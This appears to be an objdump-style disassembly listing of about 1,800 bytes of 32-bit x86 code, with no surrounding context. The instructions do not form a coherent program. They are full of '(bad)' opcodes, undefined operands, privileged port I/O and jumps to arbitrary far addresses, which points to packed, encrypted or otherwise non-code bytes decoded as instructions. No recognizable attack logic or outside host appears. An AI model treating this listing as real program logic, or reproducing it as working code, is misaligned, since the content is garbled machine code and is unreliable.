  40e42a:	cdq    
  40e42b:	mov    ah,0x0
  40e42d:	(bad)  
  40e42f:	push   0xa51d7534
  40e434:	and    cl,0xcc
  40e437:	inc    ebp
  40e438:	arpl   WORD PTR [ecx-0x70c9b0e4],dx
  40e43e:	mov    edi,0xe57dbb27
  40e443:	mov    al,ds:0x975c45e2
  40e448:	scas   eax,DWORD PTR es:[edi]
  40e449:	aaa    
  40e44a:	xor    eax,0x2dcea487
  40e44f:	std    
  40e450:	leave  
  40e451:	dec    ebx
  40e452:	cli    
  40e453:	push   ss
  40e454:	mov    eax,ds:0xdffc0107
  40e459:	in     al,0x31
  40e45b:	jnp    0x40e431
  40e45d:	fnsave [edx+0x17]
  40e460:	shl    al,cl
  40e462:	cmp    BYTE PTR [ecx],0x10
  40e465:	dec    ebx
  40e466:	or     al,0xe4
  40e468:	jmp    0x9f78f5f4
  40e46d:	ret    
  40e46e:	push   esp
  40e46f:	mov    al,0xa3
  40e471:	aad    0x6e
  40e473:	icebp  
  40e474:	cmp    eax,0x132a96d5
  40e479:	push   eax
  40e47a:	add    ch,BYTE PTR [ebx+0x25]
  40e47d:	jno    0x40e4d6
  40e47f:	inc    ebx
  40e480:	cli    
  40e481:	lods   al,BYTE PTR ds:[esi]
  40e482:	ds data16 icebp 
  40e485:	mov    dh,0x99
  40e487:	inc    esi
  40e488:	loop   0x40e43f
  40e48a:	adc    dh,BYTE PTR [esi-0x59]
  40e48d:	sar    esi,0x9c
  40e490:	jecxz  0x40e427
  40e492:	fwait
  40e493:	nop
  40e494:	inc    edi
  40e495:	xor    eax,0xacf7d11b
  40e49a:	push   edx
  40e49b:	mov    bh,0x49
  40e49d:	add    al,0xa6
  40e49f:	push   edx
  40e4a0:	push   edi
  40e4a1:	les    edx,FWORD PTR [edx+0x43]
  40e4a4:	xchg   esi,eax
  40e4a5:	inc    ecx
  40e4a6:	cmc    
  40e4a7:	mul    DWORD PTR ds:0x9b4fe366
  40e4ad:	pusha  
  40e4ae:	outs   dx,BYTE PTR ds:[esi]
  40e4af:	xchg   ecx,eax
  40e4b0:	push   0x7d
  40e4b2:	jae    0x40e4c2
  40e4b4:	xchg   ebp,eax
  40e4b5:	or     BYTE PTR [ebp-0x6217db63],cl
  40e4bb:	jp     0x40e49e
  40e4bd:	sub    ebp,0x0
  40e4c0:	mov    ch,dh
  40e4c2:	pop    ebx
  40e4c3:	push   es
  40e4c4:	fcom   QWORD PTR [edi-0x4f]
  40e4c7:	mov    ebp,0x84a7f5d2
  40e4cc:	std    
  40e4cd:	(bad)  
  40e4ce:	fmul   DWORD PTR [ebx-0x52778d86]
  40e4d4:	fwait
  40e4d5:	fwait
  40e4d6:	add    eax,0xeee3f20f
  40e4db:	mov    bl,BYTE PTR [esi-0x6d1721a4]
  40e4e1:	mul    DWORD PTR [edi-0x5a132055]
  40e4e7:	pop    edi
  40e4e8:	(bad)  
  40e4e9:	int    0x6d
  40e4eb:	mov    ch,0xa1
  40e4ed:	mov    edi,0x76efb507
  40e4f2:	cmp    eax,0x8d8d31d4
  40e4f7:	mov    cs,ebp
  40e4f9:	xor    edx,DWORD PTR [eax+0x7f774d00]
  40e4ff:	jmp    0x5b6e:0x8ee4da46
  40e506:	pushf  
  40e507:	mov    esp,DWORD PTR [edx-0x21e08a2e]
  40e50d:	xor    al,0x95
  40e50f:	adc    al,0xde
  40e511:	and    BYTE PTR [edi-0x42b63705],bl
  40e517:	jbe    0x40e565
  40e519:	mov    ch,0xe2
  40e51b:	adc    bl,dl
  40e51d:	aaa    
  40e51e:	out    dx,al
  40e51f:	aas    
  40e520:	xchg   esi,eax
  40e521:	push   ss
  40e522:	cdq    
  40e523:	xlat   BYTE PTR ds:[ebx]
  40e524:	sbb    bl,dh
  40e526:	dec    edx
  40e527:	ror    DWORD PTR [eax-0xc92fb21],cl
  40e52d:	xchg   ecx,eax
  40e52e:	leave  
  40e52f:	pop    esp
  40e530:	aam    0x64
  40e532:	jge    0x40e58f
  40e534:	dec    esp
  40e535:	push   ebp
  40e536:	scas   al,BYTE PTR es:[edi]
  40e537:	pop    ds
  40e538:	ret    0x99b7
  40e53b:	fld    QWORD PTR [ebp-0x5]
  40e53e:	loopne 0x40e51e
  40e540:	add    BYTE PTR [eax-0x467c2a1d],bl
  40e546:	push   0x28
  40e548:	push   edi
  40e549:	push   0xfc533265
  40e54e:	or     DWORD PTR [ebp+0x4178c3ba],ecx
  40e554:	sub    eax,0xa252d9cf
  40e559:	sub    esi,eax
  40e55b:	jne    0x40e5b2
  40e55d:	loop   0x40e58b
  40e55f:	jbe    0x40e5a7
  40e561:	fimul  WORD PTR [edi+0x0]
  40e564:	pusha  
  40e565:	push   0x1a040871
  40e56a:	lds    ecx,FWORD PTR [eax-0x63]
  40e56d:	ins    DWORD PTR es:[edi],dx
  40e56e:	dec    eax
  40e56f:	cmp    al,0xf0
  40e571:	xor    al,0xf4
  40e573:	and    al,0xe1
  40e575:	fadd   st,st(3)
  40e577:	add    eax,0xb25387ab
  40e57c:	adc    eax,0xf037c3af
  40e581:	ficomp WORD PTR [esp+ecx*4]
  40e584:	cmp    dh,0xb2
  40e587:	fimul  WORD PTR [ecx-0x2d]
  40e58a:	out    dx,eax
  40e58b:	jbe    0x40e5df
  40e58d:	inc    al
  40e58f:	mov    al,ds:0x4df293be
  40e594:	push   edi
  40e595:	stc    
  40e596:	ficomp DWORD PTR [ebx]
  40e598:	lods   al,BYTE PTR ds:[esi]
  40e599:	imul   ecx,DWORD PTR [ebp+0x686cbc15],0x9
  40e5a0:	mov    al,ds:0xae7af86a
  40e5a5:	pop    ebx
  40e5a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5a7:	mov    esi,0x3f4ec2b9
  40e5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5ad:	adc    DWORD PTR [edx+0x266d8cb0],ecx
  40e5b3:	es leave 
  40e5b5:	fdivr  st(4),st
  40e5b7:	shl    BYTE PTR [esi*1+0x4bda90e7],cl
  40e5be:	imul   esp,DWORD PTR [edi],0xe1ae2e47
  40e5c4:	adc    DWORD PTR [ecx],ebx
  40e5c6:	sbb    eax,0x3f168776
  40e5cb:	repnz fidivr WORD PTR [edi+edi*8+0x2d534dfe]
  40e5d3:	stos   BYTE PTR es:[edi],al
  40e5d4:	pop    edx
  40e5d5:	sub    al,0x6f
  40e5d7:	jb     0x40e5b2
  40e5d9:	mov    esi,0xf709523f
  40e5de:	ror    esi,cl
  40e5e0:	jmp    0x1194:0xbc75c1c1
  40e5e7:	cmp    dh,dl
  40e5e9:	leave  
  40e5ea:	addr16 xor al,0x10
  40e5ed:	icebp  
  40e5ee:	in     al,0x49
  40e5f0:	sub    ah,bh
  40e5f2:	mov    esp,0xe317ab5e
  40e5f7:	xor    DWORD PTR [ecx-0x4d],esi
  40e5fa:	addr16 dec ebp
  40e5fc:	pop    eax
  40e5fd:	push   eax
  40e5fe:	dec    edi
  40e5ff:	jb     0x40e629
  40e601:	das    
  40e602:	ja     0x40e5e2
  40e604:	xchg   ebp,eax
  40e605:	neg    bl
  40e607:	adc    ah,al
  40e609:	fwait
  40e60a:	pop    ss
  40e60b:	add    al,0x52
  40e60d:	shr    BYTE PTR [eax-0x1c154f99],0xf6
  40e614:	add    BYTE PTR [edx+0x4ea5db5],0x7
  40e61b:	xchg   edx,eax
  40e61c:	pop    eax
  40e61d:	bound  esp,QWORD PTR [esi+0x10a8b615]
  40e623:	and    dh,cl
  40e625:	or     ecx,DWORD PTR [edi+esi*2]
  40e628:	out    dx,al
  40e629:	and    edi,DWORD PTR [ecx-0x645c71f9]
  40e62f:	shl    BYTE PTR [ebx+0x49e8b413],0xd
  40e636:	(bad)  
  40e637:	mov    WORD PTR [ebp-0x4a],?
  40e63a:	xchg   esi,eax
  40e63b:	test   bl,dl
  40e63d:	xchg   edi,eax
  40e63e:	mul    BYTE PTR [edx+0x357fb60]
  40e644:	sub    DWORD PTR [edx],ecx
  40e646:	add    BYTE PTR [ebx-0x17],0xc8
  40e64a:	jnp    0x40e62b
  40e64c:	shl    BYTE PTR [edi+0x5f],1
  40e64f:	mul    DWORD PTR [edi]
  40e651:	dec    eax
  40e652:	seto   dh
  40e655:	jecxz  0x40e64e
  40e657:	fldcw  WORD PTR [eax]
  40e659:	bnd ja 0x40e639
  40e65c:	std    
  40e65d:	shl    BYTE PTR [esi],1
  40e65f:	cmp    eax,0x4ba387dc
  40e664:	and    eax,0x76d49ea9
  40e669:	or     si,WORD PTR fs:[ebx]
  40e66d:	jecxz  0x40e6c0
  40e66f:	jmp    0x40e65b
  40e671:	std    
  40e672:	int3   
  40e673:	pop    ebp
  40e674:	mov    dl,0x8e
  40e676:	retf   0xf836
  40e679:	mov    al,ds:0x334d6614
  40e67e:	xchg   esi,esi
  40e680:	and    DWORD PTR [ecx+0xf],0x7c
  40e684:	xchg   esi,eax
  40e685:	cmp    ch,BYTE PTR [esi]
  40e687:	and    BYTE PTR [edx+0x63],dl
  40e68a:	int    0x5e
  40e68c:	loop   0x40e68f
  40e68e:	es push 0xd7c0ac93
  40e694:	fs push ecx
  40e696:	cmp    DWORD PTR [esi+0x31],ebp
  40e699:	call   0xa79d79f4
  40e69e:	ja     0x40e6b2
  40e6a0:	scas   eax,DWORD PTR es:[edi]
  40e6a1:	jmp    0x40e63a
  40e6a3:	stos   BYTE PTR es:[edi],al
  40e6a4:	jbe    0x40e6f3
  40e6a6:	xor    dh,ah
  40e6a8:	jmp    0x277b:0xace06abc
  40e6af:	mov    ds:0x2ac7f316,al
  40e6b4:	fbstp  TBYTE PTR [edx-0x27]
  40e6b7:	lds    esp,FWORD PTR [eax]
  40e6b9:	out    dx,eax
  40e6ba:	int3   
  40e6bb:	sbb    dl,cl
  40e6bd:	inc    ecx
  40e6be:	add    DWORD PTR [ebp+edi*1+0x5e],edx
  40e6c2:	dec    esi
  40e6c3:	dec    esp
  40e6c4:	pop    ebx
  40e6c5:	and    al,0xf8
  40e6c7:	pop    eax
  40e6c8:	adc    BYTE PTR [ebp+0x1e],0xed
  40e6cc:	gs pop esp
  40e6ce:	lock mov ebp,0x1ab054
  40e6d4:	int    0x97
  40e6d6:	addr16 fs push ecx
  40e6d9:	sub    esp,ebp
  40e6db:	mov    ecx,0x1f348b11
  40e6e0:	xchg   edi,eax
  40e6e1:	dec    ecx
  40e6e2:	int3   
  40e6e3:	fnstenv [eax]
  40e6e5:	adc    ecx,DWORD PTR [edx+0x7a]
  40e6e8:	jno    0x40e6f1
  40e6ea:	adc    esi,edi
  40e6ec:	lahf   
  40e6ed:	leave  
  40e6ee:	xchg   BYTE PTR [ecx-0x87d9c5c],dh
  40e6f4:	pop    ds
  40e6f5:	imul   ecx,DWORD PTR ds:0x4779d95,0x40
  40e6fc:	test   al,0x90
  40e6fe:	aas    
  40e6ff:	mov    bh,0x1d
  40e701:	add    BYTE PTR [bx],cl
  40e704:	rol    BYTE PTR [edi+0x69],0x8e
  40e708:	in     al,dx
  40e709:	push   ebp
  40e70a:	push   ss
  40e70b:	mov    ds:0x75973c50,eax
  40e710:	sbb    al,0x68
  40e712:	fwait
  40e713:	icebp  
  40e714:	das    
  40e715:	bound  ecx,QWORD PTR ds:0xdfe3fb0e
  40e71b:	pop    ecx
  40e71c:	imul   edi,DWORD PTR [eax+0x2fbebfa6],0x8b79063c
  40e726:	gs leave 
  40e728:	jno    0x40e724
  40e72a:	inc    ebx
  40e72b:	stos   DWORD PTR es:[edi],eax
  40e72c:	icebp  
  40e72d:	(bad)  
  40e72e:	cwde   
  40e72f:	mov    al,ds:0x8b2ad55f
  40e734:	fmul   DWORD PTR es:[ebp+0x26c5119]
  40e73b:	sbb    ebx,DWORD PTR [ebx]
  40e73d:	or     cl,BYTE PTR [ecx+0x2d]
  40e740:	push   es
  40e741:	xchg   ah,ah
  40e743:	or     DWORD PTR [eax-0x6b],0xffffff87
  40e747:	dec    eax
  40e748:	repz in eax,0xfe
  40e74b:	(bad)  
  40e74c:	in     eax,dx
  40e74d:	xchg   ebp,eax
  40e74e:	sahf   
  40e74f:	mov    ebp,0x8e5192f9
  40e754:	arpl   WORD PTR [ebx+0x34],dx
  40e757:	ja     0x40e7cd
  40e759:	fadd   DWORD PTR [ecx-0x6e68e370]
  40e75f:	into   
  40e760:	pcmpgtb mm2,QWORD PTR [ebx+ecx*4-0x6c]
  40e765:	adc    ch,BYTE PTR [edx]
  40e767:	inc    edx
  40e768:	scas   al,BYTE PTR es:[edi]
  40e769:	xchg   esp,eax
  40e76a:	les    edx,FWORD PTR [edi-0x60]
  40e76d:	jmp    0x5e3d:0xfc03d3b3
  40e774:	sub    BYTE PTR [edx],0xe6
  40e777:	push   esp
  40e778:	jmp    0x40e7ed
  40e77a:	add    ebp,DWORD PTR [edi-0x29]
  40e77d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e77e:	in     eax,0x82
  40e780:	add    al,0x88
  40e782:	xchg   ebx,eax
  40e783:	std    
  40e784:	js     0x40e7da
  40e786:	push   ecx
  40e787:	inc    edi
  40e788:	jae    0x40e808
  40e78a:	add    cl,BYTE PTR [edi+ebx*2]
  40e78d:	mov    bl,0xb1
  40e78f:	sbb    al,0xd3
  40e791:	sbb    DWORD PTR [ebx],0x40a96737
  40e797:	xchg   DWORD PTR ds:0xdf3dbab8,edi
  40e79d:	push   esi
  40e79e:	fdivr  QWORD PTR [edx+edx*8-0x2003708f]
  40e7a5:	or     dh,BYTE PTR [edi-0x672f263e]
  40e7ab:	sbb    ebx,DWORD PTR [eax+esi*1-0x7fc8a7f5]
  40e7b2:	mov    cl,0x52
  40e7b4:	xor    al,0x3e
  40e7b6:	dec    ecx
  40e7b7:	ror    ch,1
  40e7b9:	mov    cl,0xfb
  40e7bb:	xor    eax,0x3b3abf08
  40e7c0:	fist   DWORD PTR [eax+edi*2]
  40e7c3:	or     DWORD PTR [esi-0x14],edx
  40e7c6:	mov    ecx,0x7993170d
  40e7cb:	ss adc al,ah
  40e7ce:	jo     0x40e824
  40e7d0:	inc    eax
  40e7d1:	js     0x40e7d7
  40e7d3:	test   al,0xd7
  40e7d5:	dec    ebx
  40e7d6:	xchg   edx,eax
  40e7d7:	jne    0x40e7b5
  40e7d9:	out    dx,eax
  40e7da:	xchg   esp,eax
  40e7db:	push   ds
  40e7dc:	(bad)  
  40e7dd:	jne    0x40e832
  40e7df:	mov    edx,0xea1b6cec
  40e7e4:	xchg   ebx,eax
  40e7e5:	ja     0xfd2f9f4
  40e7eb:	jnp    0x40e844
  40e7ed:	and    al,0x32
  40e7ef:	xchg   ebx,eax
  40e7f0:	sbb    eax,0xd1df65f5
  40e7f5:	into   
  40e7f6:	jmp    0x1f0e8a77
  40e7fb:	jnp    0x40e866
  40e7fd:	pop    ebp
  40e7fe:	call   0x533ac5aa
  40e803:	or     DWORD PTR [ecx],eax
  40e805:	into   
  40e806:	(bad)  
  40e808:	(bad)  
  40e809:	or     eax,0xd21bf857
  40e80e:	jo     0x40e795
  40e810:	ret    
  40e811:	pop    esi
  40e812:	hlt    
  40e813:	xor    bl,BYTE PTR [ebx-0x99f4ad1]
  40e819:	imul   esi,DWORD PTR [edi-0x4ca68ac1],0xfffffffc
  40e820:	push   es
  40e821:	into   
  40e822:	mov    ch,0xd2
  40e824:	or     ah,BYTE PTR [edi+0x1bee339b]
  40e82a:	arpl   WORD PTR [eax+0x31306425],bx
  40e830:	push   eax
  40e831:	cwde   
  40e832:	jo     0x40e7d5
  40e834:	sub    BYTE PTR [eax+0x58],ah
  40e837:	aad    0xd6
  40e839:	push   0x2e
  40e83b:	scas   al,BYTE PTR es:[edi]
  40e83c:	loopne 0x40e7de
  40e83e:	sbb    BYTE PTR [esi],ch
  40e840:	jge    0x40e80a
  40e842:	mov    cl,BYTE PTR [edx]
  40e844:	add    ebx,ebx
  40e846:	shl    DWORD PTR [eax],1
  40e848:	je     0x40e84b
  40e84a:	push   ss
  40e84b:	add    al,0x90
  40e84d:	cmp    edi,ebx
  40e84f:	jg     0x40e8c9
  40e851:	jo     0x40e807
  40e853:	or     edx,edi
  40e855:	jg     0x40e8ca
  40e857:	mov    ch,BYTE PTR [eax+eax*4]
  40e85a:	mov    cs,WORD PTR [ecx+0x43a83928]
  40e860:	scas   al,BYTE PTR es:[edi]
  40e861:	retf   0xea15
  40e864:	int3   
  40e865:	sub    DWORD PTR [ebx+ecx*2],esp
  40e868:	mov    cl,0xab
  40e86a:	adc    eax,0x95c37cae
  40e86f:	xchg   esp,eax
  40e870:	cli    
  40e871:	es aad 0x62
  40e874:	inc    edi
  40e875:	repz jo 0x40e8ef
  40e878:	ds add eax,0x94a720dc
  40e87e:	add    dl,BYTE PTR [edx]
  40e880:	sahf   
  40e881:	and    al,BYTE PTR [esi]
  40e883:	out    0xe4,eax
  40e885:	mov    WORD PTR [ecx],ds
  40e887:	iretw  
  40e889:	mov    ah,BYTE PTR [ebp+0x59]
  40e88c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e88d:	out    dx,eax
  40e88e:	cmp    eax,esi
  40e890:	outs   dx,DWORD PTR ds:[esi]
  40e891:	and    BYTE PTR [edx+0x26],bh
  40e894:	mov    al,0x77
  40e896:	int3   
  40e897:	sti    
  40e898:	(bad)  
  40e89a:	jp     0x40e8ad
  40e89c:	test   DWORD PTR [eax+ebx*4],edx
  40e89f:	mov    ds:0xd2526d4a,eax
  40e8a4:	mov    ah,0xa
  40e8a6:	lods   al,BYTE PTR ds:[esi]
  40e8a7:	in     al,dx
  40e8a8:	dec    esi
  40e8a9:	js     0x40e843
  40e8ab:	faddp  st(2),st
  40e8ad:	dec    edx
  40e8ae:	out    dx,al
  40e8af:	out    dx,al
  40e8b0:	add    al,0xe2
  40e8b2:	mov    ebx,0xfcfb3c45
  40e8b7:	mov    edx,0x794dbe99
  40e8bc:	sti    
  40e8bd:	sub    al,0xac
  40e8bf:	icebp  
  40e8c0:	dec    esp
  40e8c1:	inc    esp
  40e8c2:	push   eax
  40e8c3:	xchg   edi,eax
  40e8c4:	mov    eax,ds:0x44f81150
  40e8c9:	(bad)  
  40e8ca:	stos   DWORD PTR es:[edi],eax
  40e8cb:	retf   
  40e8cc:	xchg   ecx,eax
  40e8cd:	fdivr  DWORD PTR [esi]
  40e8cf:	inc    eax
  40e8d0:	jg     0x40e85f
  40e8d2:	out    0x9f,eax
  40e8d4:	pushf  
  40e8d5:	(bad)  
  40e8d7:	outs   dx,DWORD PTR ds:[esi]
  40e8d8:	sub    ch,BYTE PTR [ebp-0x15]
  40e8db:	repnz sub edx,DWORD PTR [eax]
  40e8de:	movnti DWORD PTR [edx],ecx
  40e8e1:	xchg   ebp,eax
  40e8e2:	mov    dl,0xb3
  40e8e4:	stos   BYTE PTR es:[di],al
  40e8e6:	push   esp
  40e8e7:	dec    ecx
  40e8e8:	ffreep st(1)
  40e8ea:	xor    al,0xb7
  40e8ec:	outs   dx,DWORD PTR ds:[esi]
  40e8ed:	pop    ebp
  40e8ee:	push   ebp
  40e8ef:	loop   0x40e8e0
  40e8f1:	test   DWORD PTR [edx-0x7b],ebx
  40e8f4:	xor    BYTE PTR [ebx-0x59],bh
  40e8f7:	int    0x1a
  40e8f9:	jg     0x40e8ae
  40e8fb:	xchg   ebx,eax
  40e8fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8fd:	cmp    BYTE PTR [edi],dl
  40e8ff:	in     al,dx
  40e900:	mov    ah,BYTE PTR ds:0xedbe6762
  40e906:	int    0xfb
  40e908:	push   es
  40e909:	and    al,0xe8
  40e90b:	sub    ecx,DWORD PTR ds:0x478836f8
  40e911:	mov    esi,0xa7a50853
  40e916:	fnsave [ebx-0x6d]
  40e919:	sub    DWORD PTR [ebx+0x6d],edx
  40e91c:	jnp    0x40e996
  40e91e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e91f:	mov    al,ds:0x9a2632a3
  40e924:	push   ebp
  40e925:	or     WORD PTR [ebx-0x7],sp
  40e929:	nop
  40e92a:	push   edi
  40e92b:	mov    edx,0x6b2a16c2
  40e930:	mov    ebx,?
  40e932:	ficom  WORD PTR [edx]
  40e934:	or     BYTE PTR [ecx-0x1b],dh
  40e937:	dec    ecx
  40e938:	ret    0x9e95
  40e93b:	push   esi
  40e93c:	push   es
  40e93d:	shl    DWORD PTR [edx-0x43],cl
  40e940:	(bad)  
  40e941:	jecxz  0x40e96e
  40e943:	ffreep st(6)
  40e945:	sbb    ebp,DWORD PTR [eax+0x21]
  40e948:	out    0x1a,eax
  40e94a:	je     0x40e8f8
  40e94c:	rol    DWORD PTR [edi+0xe],0xdd
  40e950:	scas   al,BYTE PTR es:[edi]
  40e951:	inc    edx
  40e952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e953:	push   0xffffffac
  40e955:	inc    esp
  40e956:	in     eax,dx
  40e957:	sub    edi,DWORD PTR [edi-0xf19c6f]
  40e95d:	xchg   esi,eax
  40e95e:	retf   
  40e95f:	inc    eax
  40e960:	xor    cl,ah
  40e962:	cmp    BYTE PTR [esi-0x58],ah
  40e965:	aas    
  40e966:	cmp    BYTE PTR [eax],ah
  40e968:	ficomp DWORD PTR [ebp+0x55]
  40e96b:	retf   0xe9ff
  40e96e:	and    DWORD PTR [ebp-0x390f4343],edx
  40e974:	dec    esp
  40e975:	dec    esp
  40e976:	(bad)  [edi+edi*1]
  40e979:	jmp    0x4bb:0x39858848
  40e980:	daa    
  40e981:	fs push cs
  40e983:	mov    al,0x62
  40e985:	push   es
  40e986:	je     0x40e9d3
  40e988:	outs   dx,DWORD PTR ds:[esi]
  40e989:	xchg   edi,eax
  40e98a:	push   ds
  40e98b:	(bad)  
  40e98c:	fidiv  DWORD PTR [esi]
  40e98e:	jecxz  0x40e932
  40e990:	fwait
  40e991:	lock xor ch,dl
  40e994:	rcl    DWORD PTR [esp+ebx*2],1
  40e997:	and    DWORD PTR [edx-0x5],esi
  40e99a:	std    
  40e99b:	sbb    DWORD PTR [ebx+0x616aea9d],eax
  40e9a1:	adc    al,0x37
  40e9a3:	inc    ebx
  40e9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9a5:	push   0xffffffa6
  40e9a7:	(bad)  
  40e9a8:	clc    
  40e9a9:	add    BYTE PTR [ebp+eiz*1+0x37c80596],dl
  40e9b0:	add    ebp,DWORD PTR [eax+0x7f]
  40e9b3:	push   edi
  40e9b4:	mov    DWORD PTR ds:0x5e384b0d,edx
  40e9ba:	mov    WORD PTR [ebp+0x44],?
  40e9bd:	push   esp
  40e9be:	ins    BYTE PTR es:[edi],dx
  40e9bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9c0:	adc    dl,dl
  40e9c2:	sbb    DWORD PTR [edx-0x71],esi
  40e9c5:	jae    0x40e9cc
  40e9c7:	jecxz  0x40e95f
  40e9c9:	lods   al,BYTE PTR ds:[esi]
  40e9ca:	ins    BYTE PTR es:[edi],dx
  40e9cb:	leave  
  40e9cc:	(bad)  
  40e9cd:	xchg   BYTE PTR [edx-0x3],cl
  40e9d0:	(bad)  
  40e9d1:	and    al,0x1f
  40e9d3:	inc    edi
  40e9d4:	loopne 0x40ea29
  40e9d6:	mov    ds:0xc81bb797,eax
  40e9db:	call   0x5d75:0x519d84e0
  40e9e2:	push   ecx
  40e9e3:	inc    edi
  40e9e4:	repnz and eax,edx
  40e9e7:	dec    eax
  40e9e8:	jp     0x40e977
  40e9ea:	adc    BYTE PTR [eax],cl
  40e9ec:	sahf   
  40e9ed:	xor    eax,0x8acfe9e9
  40e9f2:	(bad)  
  40e9f3:	addr16 jno 0x40e9ea
  40e9f6:	mov    cl,0x5f
  40e9f8:	(bad)  
  40e9f9:	xchg   esi,eax
  40e9fa:	jp     0x40ea19
  40e9fc:	lock inc ebx
  40e9fe:	push   0x26
  40ea00:	data16 aaa 
  40ea02:	adc    al,0xe8
  40ea04:	test   ebx,esp
  40ea06:	and    dh,bl
  40ea08:	push   edi
  40ea09:	(bad)  
  40ea0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea0b:	bound  edi,QWORD PTR ds:0x290bc206
  40ea11:	jmp    0x5abd:0x96b2d8f0
  40ea18:	jbe    0x40e9af
  40ea1a:	push   ecx
  40ea1b:	imul   edi,DWORD PTR [eax+eiz*2-0x472ed80a],0xffffffa5
  40ea23:	scas   eax,DWORD PTR es:[edi]
  40ea24:	dec    edi
  40ea25:	loop   0x40e9bc
  40ea27:	cmp    esi,edx
  40ea29:	dec    ecx
  40ea2a:	xchg   esi,eax
  40ea2b:	and    edx,ebp
  40ea2d:	outs   dx,BYTE PTR ds:[esi]
  40ea2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea2f:	aas    
  40ea30:	sbb    eax,0xf943c5b3
  40ea35:	jae    0x40ea8d
  40ea37:	adc    dh,BYTE PTR [eax+0x1bd0b115]
  40ea3d:	(bad)  
  40ea3e:	in     al,dx
  40ea3f:	push   edi
  40ea40:	mov    eax,0xde7eaa13
  40ea45:	sub    ebp,DWORD PTR [ebp+edi*4-0xa]
  40ea49:	das    
  40ea4a:	mov    ebp,0x48b17ccb
  40ea4f:	push   cs
  40ea50:	mov    fs,WORD PTR [ebp+0x2673187c]
  40ea56:	mov    edx,0xc69692d6
  40ea5b:	int    0xcb
  40ea5d:	or     bl,BYTE PTR [edi]
  40ea5f:	call   0xa534053a
  40ea64:	xchg   esp,eax
  40ea65:	add    bh,dh
  40ea67:	xor    BYTE PTR [edi-0x57],cl
  40ea6a:	xor    BYTE PTR [edx-0x76a79b7a],0x8c
  40ea71:	mov    ds:0x54279a76,al
  40ea76:	shr    al,cl
  40ea78:	(bad)  
  40ea79:	in     al,0x38
  40ea7b:	jb     0x40ea5a
  40ea7d:	imul   ebp,DWORD PTR [esp+eax*2-0x3128d2d7],0x51
  40ea85:	adc    BYTE PTR [edi+0x40],ch
  40ea88:	inc    esi
  40ea89:	jnp    0x40eade
  40ea8b:	dec    edx
  40ea8c:	push   ecx
  40ea8d:	(bad)  
  40ea8e:	out    0x44,al
  40ea90:	scas   al,BYTE PTR es:[edi]
  40ea91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea92:	and    BYTE PTR [edi-0x286d4f90],ah
  40ea98:	cli    
  40ea99:	mul    DWORD PTR [ecx+0x8ba4aad]
  40ea9f:	pop    ds
  40eaa0:	or     eax,0x62a60e33
  40eaa5:	(bad)  
  40eaa6:	adc    ecx,DWORD PTR [ebx+0x377e1b0f]
  40eaac:	mov    esi,0x190d0957
  40eab1:	stos   BYTE PTR es:[edi],al
  40eab2:	jo     0x40ea45
  40eab4:	retf   0x8d54
  40eab7:	adc    BYTE PTR [ebp+0x4d28e03c],dh
  40eabd:	repnz inc edx
  40eabf:	call   0xa1db:0x1cfc4289
  40eac6:	push   0x127c365
  40eacb:	mov    edx,0xde6a0b34
  40ead0:	cwde   
  40ead1:	inc    esi
  40ead2:	imul   BYTE PTR [edi+0x6fc8c8ea]
  40ead8:	pop    edx
  40ead9:	arpl   WORD PTR [esi+ebp*1+0x27],bx
  40eadd:	add    ebx,esi
  40eadf:	rcr    DWORD PTR [edx+0x60],1
  40eae2:	dec    ebx
  40eae3:	aad    0xf8
  40eae5:	mov    edi,0x2bacbf7c
  40eaea:	out    dx,eax
  40eaeb:	push   ecx
  40eaec:	jecxz  0x40eb5d
  40eaee:	push   edi
  40eaef:	cmp    dh,bl
  40eaf1:	shr    BYTE PTR [esi],cl
  40eaf3:	xor    al,0x5c
  40eaf5:	xor    bh,ah
  40eaf7:	mov    cl,0x2b
  40eaf9:	pusha  
  40eafa:	hlt    
  40eafb:	popa   
  40eafc:	lahf   
  40eafd:	inc    eax
  40eafe:	rcl    ebp,0x93
  40eb01:	gs push ebx
  40eb03:	xor    BYTE PTR ds:0x5823eb01,0xc8
  40eb0a:	sahf   
  40eb0b:	dec    edx
  40eb0c:	fidivr DWORD PTR [edx-0x35]
  40eb0f:	xchg   esi,eax
  40eb10:	mov    eax,ds:0x19cfc5ea
  40eb15:	pop    ecx
  40eb16:	cdq    
  40eb17:	sbb    bh,BYTE PTR [ecx]
  40eb19:	out    0xb9,eax
  40eb1b:	jb     0x40eae8
  40eb1d:	mov    dl,0x9d
  40eb1f:	dec    esi
  40eb20:	ins    BYTE PTR es:[edi],dx
  40eb21:	jbe    0x40eacd
  40eb23:	iret   
  40eb24:	push   DWORD PTR [edx+0x3bbc0c64]
  40eb2a:	sahf   
  40eb2b:	xor    DWORD PTR [edi+0x16],0x22912bb9
  40eb32:	add    eax,0xc3b62b25
  40eb37:	mov    ds:0xd964924,al
  40eb3c:	fdivr  DWORD PTR [edx+0x33]
  40eb3f:	test   DWORD PTR ds:0x692cf3c1,esi
  40eb45:	mov    dh,0xb0
  40eb47:	pop    DWORD PTR [ecx+0x3815faf2]
  40eb4d:	dec    edi
  40eb4e:	ror    BYTE PTR [ebx-0x45],cl
  40eb51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb52:	int    0x33
  40eb54:	xor    DWORD PTR [ebp+eax*4+0x5f4176b3],esi
  40eb5b:	fild   WORD PTR [ecx]
  40eb5d:	inc    DWORD PTR [esi-0x6cb688a9]
  40eb63:	or     BYTE PTR [edx+0x20],dh
  40eb66:	sbb    cl,BYTE PTR [ebx-0x48]
  40eb69:	pop    ebx
  40eb6a:	dec    eax
  40eb6b:	arpl   WORD PTR [eax],ax
  40eb6d:	dec    esi
  40eb6e:	push   esi
  40eb6f:	in     al,0x20
  40eb71:	push   ebx
  40eb72:	call   0x683b11e0
  40eb77:	pop    eax
  40eb78:	cdq    
